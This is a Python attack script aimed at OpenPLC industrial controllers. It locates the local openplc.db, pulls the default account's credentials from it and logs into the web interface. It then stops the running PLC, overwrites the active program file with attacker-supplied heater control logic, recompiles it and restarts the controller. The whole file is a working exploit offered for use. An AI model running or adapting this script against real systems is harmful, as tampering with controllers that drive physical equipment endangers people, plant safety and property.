import requests
import sys
import time
import argparse
import signal
import sqlite3
import fnmatch
import os

def signal_handler(signum, frame):
    raise Exception

parser = argparse.ArgumentParser(description="tHiS1s4aTT@cKEr")
parser.add_argument('-t', '--target', help='127.0.0.1')
parser.add_argument('-p', '--port', help='8080')

args = parser.parse_args()

if type(args.target) != str or type(args.port) != str or len(args.target) <=3 or len(args.port) < 3:              
    print('[x] Error. Get help from -h. ')
    exit()

host = 'http://' + args.target + ':' + args.port

print()
warning = "Searching the location of installed OpenPLC"
print(warning.center(80, "."))

path = '/'
whereareyou = [os.path.join(dirpath, f) for dirpath, dirnames, files in os.walk(path) for f in fnmatch.filter(files, 'openplc.db')]

if len(whereareyou) < 1:
    print("[x] Can't find installation ")
    exit()
else:
    print("[+] OpenPLC is installed: ", os.path.dirname(whereareyou[0]))


x = requests.Session()
conn = sqlite3.connect(whereareyou[0])
cursor = conn.cursor()
print('[+] Connected to DB. ')

def find_user():
    cmd0 = cursor.execute("SELECT * FROM Users WHERE user_id = 10")         # user_id = 10 : default account
    user_info = cmd0.fetchone()
    id = user_info[2]
    password = user_info[4]
    print(f'[+] {user_info[0]}: username = {user_info[1]} | ID = {user_info[2]} | PWD = {user_info[4]} | EMAIL = {user_info[3]}')
    return id, password

def current_prog_check(): 
    f = open(os.path.dirname(whereareyou[0])+'/active_program')
    running = f.read().replace("\n", "").replace("\r", "")
    print("[+] Currently: ", running)
    return running

def plcstop():
    stopplc = host + '/stop_plc'
    print('[+] Stopping program now ... ')
    stop = x.get(stopplc)
    time.sleep(3)
    if stop.status_code == 200:
        print('[+] 200. Stopped ')
    elif stop.status_code == 500:
        print('[x] 500 Internal Error. ')
    else:
        print('[x] Something went wrong. ', stop.status_code)

def auth():
    user, pwd = find_user()
    print('[+] Credentials input '+user+':'+pwd+'') 
    time.sleep(1)   
    submit = {
        'username': user,
        'password': pwd
    }
    try:
        loginattempt = x.post(host + '/login', data=submit)
        if loginattempt.status_code == 200:
            time.sleep(3)
            cnt = current_prog_check()
            return cnt
        else:
            return 204
    except requests.exceptions.ConnectionError:
        print(e)
        print('[x] Please try again')
        exit()


def create_file(prog_id):      # overwrite on .../st_files/12345.st before upload
    targetfolder = os.path.dirname(whereareyou[0])
    f = open(f"{targetfolder}/st_files/{str(prog_id)}.st", 'w')
    # any kind of data can be inserted
    prog_data = """(* yOuArEunDER@tTacK *)
    FUNCTION_BLOCK Temp_Conversion
  VAR_INPUT
    raw_temp : UINT;
  END_VAR
  VAR
    voltage : REAL;
    resistance : REAL;
    steinhart : REAL;
    THERMISTORNOMINAL : REAL := 10000.0;
    TEMPERATURENOMINAL : REAL := 25.0;
    BCOEFFICIENT : REAL := 3950.0;
    SERIESRESISTOR : REAL := 10000.0;
  END_VAR
  VAR_OUTPUT
    converted_temp : INT;
    voltage_out : INT;
    resistance_out : INT;
  END_VAR

  (* Calculate Voltage *)
  voltage := UINT_TO_REAL(raw_temp);
  voltage := voltage * 0.0001535107446;

  (* Calculate Resistance *)
  resistance := voltage / 10.0;
  resistance := 1.0 / resistance;
  resistance := resistance - 1.0;
  resistance := resistance * 10000.0;


  (* Calculate Steinhart *)
  steinhart := resistance / THERMISTORNOMINAL; (* (R/Ro) *)
  steinhart := LN(steinhart); (* ln(R/Ro) *)
  steinhart := steinhart / BCOEFFICIENT; (* 1/B * ln(R/Ro) *)
  steinhart := steinhart + 1.0 / (TEMPERATURENOMINAL + 273.15); (* (1/To) *)
  steinhart := 1.0 / steinhart; (* Invert *)
  steinhart := steinhart - 273.15; (* Convert to C *)

  (* Calculate the error correction *)
  steinhart := steinhart + 9.451149;
  steinhart := steinhart / 0.894263;
  steinhart := steinhart * 100.0; (* Multiply by 100 to get 2 decimals *)

  voltage_out := REAL_TO_INT(voltage * 100.0);
  resistance_out := REAL_TO_INT(resistance);
  converted_temp := REAL_TO_INT(steinhart);

  (*
  voltage := UINT_TO_REAL(raw_temp);
  voltage := 10000.0 / (65536.0 / voltage - 1.0);
  voltage := voltage / 10000.0;
  voltage := LN(voltage);
  voltage := 1.0 / ((1.0/298.15) + (voltage * (1.0/3950.0)));
  voltage := voltage - 273.15;
  voltage := voltage * 100.0;
  converted_temp := REAL_TO_INT(voltage);
  *)
END_FUNCTION_BLOCK

PROGRAM My_Program
  VAR
    raw_temp AT %IW0 : UINT;
    Ref_Voltage AT %QW0 : UINT := 65535;
    converted_temp AT %QW1 : INT;
    voltage AT %QW7 : INT;
    resistance AT %QW8 : INT;
    setpoint AT %QW2 : INT := 4000;
    mode_register AT %QW4 : INT;
    heater_control AT %QW5 : INT;
    heater_man AT %QX99.0 : BOOL;
    heater_auto AT %QX99.1 : BOOL;
    heater AT %QX0.0 : BOOL;
  END_VAR
  VAR
    Temp_Conversion0 : Temp_Conversion;
    SUB31_OUT : INT;
    LE9_OUT : BOOL;
    GE18_OUT : BOOL;
    EQ6_OUT : BOOL;
    EQ2_OUT : BOOL;
    EQ26_OUT : BOOL;
  END_VAR

  Temp_Conversion0(raw_temp := raw_temp);
  converted_temp := Temp_Conversion0.converted_temp;
  voltage := Temp_Conversion0.voltage_out;
  resistance := Temp_Conversion0.resistance_out;
  SUB31_OUT := SUB(setpoint, 150);
  LE9_OUT := LE(converted_temp, SUB31_OUT);
  IF LE9_OUT THEN
    heater_auto := TRUE; (*set*)
  END_IF;
  GE18_OUT := GE(converted_temp, setpoint);
  IF GE18_OUT THEN
    heater_auto := FALSE; (*reset*)
  END_IF;
  EQ6_OUT := EQ(heater_control, 1);
  heater_man := EQ6_OUT;
  EQ2_OUT := EQ(mode_register, 0);
  EQ26_OUT := EQ(mode_register, 1);
  heater := heater_auto AND EQ2_OUT OR heater_man AND EQ26_OUT;
END_PROGRAM


CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK TaskMain(INTERVAL := T#50ms,PRIORITY := 0);
    PROGRAM Inst0 WITH TaskMain : My_Program;
  END_RESOURCE
END_CONFIGURATION
    """
    f.write(prog_data)
    print("[+] File is overwritten")


def plcstart():
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(30)
    start_url = host+'/start_plc'
    print('[+] Starting program now ... ')
    try:
        start = x.get(start_url)
        time.sleep(5)
        if start.status_code == 500:
            print("[x] 500 Internal Error. Check your code again. ")
            sys.exit(0)
        elif start.status_code == 200:
            print("[+] 200. Started")
        else:
            print("[x] Error: ", start.status_code)
            pass
    except Exception as timeout:
        signal.signal(signal.SIGALRM, signal_handler)
        signal.alarm(15)
        print("[+] Redirection... #1 ")        
        try:
            home = x.get(host+'/dashboard')
            time.sleep(3)
            if home.status_code == 200:
                print("[+] Done. ")
            else:
                print('[x] Something went wrong.', home.status_code)
        except Exception as timeout:            # 2nd try for redirection
            signal.signal(signal.SIGALRM, signal_handler)
            signal.alarm(30)
            print('[+] Redirection... #2')
            try:
                redirection = x.get(host+'/dashboard')
                time.sleep(3)
                if redirection.status_code == 200:
                    print("[+] Done. ")
                else:
                    print('[x] Something went wrong.', redirection.status_code)
            except Exception as timeout:
                print("[x] It takes too long. Please check. ")
                pass

def a_t_t_a_c_k(prog_name):      # prog_name = current running program
    plcstop()
    cmd = cursor.execute("SELECT Prog_ID, Name, File FROM Programs")        
    fetched = cmd.fetchall()
    for pid, name, file in fetched:
        if "Blank Program" != name and prog_name[:-3] == file[:-3]:
            print(f'[+] Found in DB: {pid} : {name}   {file}')
            create_file(file[:-3])                                          # change/overwrite on existing file
            x.get(host+'/reload-program?table_id='+str(pid))                # load target page
            print("[+] Compiling... ")
            compile_url = host+ '/compile-program?file={}'.format(file)     
            compile = x.get(compile_url)                                    # = click 'launch program' button
            time.sleep(15)                                                  # give enough time to compile (~20)
            if compile.status_code == 200:
                print('[+] 200. Back to dashboard...')
                return 200
            else:
                print('[x] Error during compiling. ', compile.status_code)
                return 500
        else:
            pass


if __name__ == '__main__': 
    
    Title = "S T A R T"
    print()
    print(Title.center(80, "*"))

    #-------------------------------- Authentication --------------------------------#
    target_prog = auth()                                                # after auth, show current running program 
    if target_prog == 500:
        exit()
    else:
        pass

    #------------------------------------ Attack ------------------------------------#
    result = a_t_t_a_c_k(target_prog)
    if result == 200:
        pass
    else:
        sys.exit(0)
    
    #--------------------------------- Start program --------------------------------#
    plcstart()
    
    print("[-] End of operation. ")
